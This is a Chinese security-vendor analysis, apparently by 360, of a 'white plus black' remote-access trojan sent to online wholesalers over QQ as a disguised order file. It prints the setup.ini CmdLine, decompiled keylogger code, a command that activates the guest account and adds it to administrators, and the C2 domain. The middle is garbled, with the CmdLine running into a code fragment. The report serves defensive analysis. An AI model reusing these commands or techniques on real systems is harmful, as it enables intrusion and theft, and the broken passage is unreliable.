# 远控木马巧设“白加黑”陷阱：瞄准网店批发商牟取钱财
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
近日，360安全中心监测到有不法分子通过添加QQ好友的形式，以沟通商品交易的名义发送名为“这几天团队的量”的文件，一旦接收并打开文件，电脑将被远程控制，不法分子可进一步盗取隐私及财物、甚至植入病毒实现敲诈勒索等操作。
360安全中心对该样本进行分析发现，“这几天团队的量.rar”是一个将木马打包在其中的压缩包文件，投递目标主要是网络批发商。牧马人通过将木马伪装成数量详情图片文件，在与商家沟通的期间，发送木马文件给商家，引诱商家中招。
当网店批发商在接受到文件后，解压出文件夹并点击了文件夹中的“宝贝批发数量.com”后，木马就会在后台偷偷跑起来。
图0：解压后文件夹内容
###
## 文件夹结构分析
    ┌─ 宝贝批发数量.com
    │
    ├─ setup.ini
    │
    └─ Data
        ├─ 2018.jpg
        │
        ├─ 360666
        │     ├─ 360666.PNG
        │     ├─ date
        │     ├─ QQAPP.exe
        │     ├─ Readme.txt
        │     ├─ TEMA
        │     ├─ WPS_office2016.lnk
        │     └─ WPS_office2017.lnk
        │
        └─ Order
              ├─ m.exe
              ├─ WoodTorch.exe
              └─ WPS.JPG
### 宝贝批发数量.com
该文件其实为白文件，它带有艾威梯科技（北京）有限公司数字签名。
图1：白文件 签名信息
程序在执行起来后会读取同目录下的setup.ini文件，根据配置文件中Install项里的CmdLine执行命令。而文件常规打开是一堆乱码，在十六进制试图下可以清楚看到Cmdline命令。
图2：记事本浏览视图
图3：十六进制浏览视图
Cmdline命令如下：
    [Install]
    CmdLine=Data\Order\WoodTorch.exe execmd Data\Order\m.exe /c Data\Order\m.exe `> 8) & 0x80 ) // 获取指定按键状态
          {
            if ( GetKeyState(20) && v2 > -1 && v3 > 64 && v3 = 0 )
                goto LABEL_22;
              if ( v3 > 64 && v3 = 0 )
                {
    LABEL_22:
                  *(&v5 + v3) = 4;
                  goto LABEL_34;
                }
                *(&v5 + v3) = 3;
              }
图12：保存键盘记录
  * 清除事件日志
图13：清除事件日志
  * 遍历进程，检测杀软
图14：杀软字符串
图15：遍历进程
  * 设置guest 密码，并添加到管理员组。
    net user guest /active:yes && net user guest 123456 && net localgroup administrators guest /add
  * 其余功能主要还有文件管理、注册表管理、进程管理、shell操作、下载文件、更新客户端、卸载客户端等
### 追溯
根据CC地址duanjiuhao.top的域名信息获取到了域名持有者的姓名、邮箱、手机号。
图16：whois信息
## 最后
年关将近，不法分子试图利用这些“白加黑”远控木马从中招用户那“谋财”。目前，360安全卫士已经对该类木马进行防御及查杀，在此也提醒网民，提防来历不明的文件、链接，同时开启安全软件，临近新年，为自己的隐私及财产安全加上一把锁。
###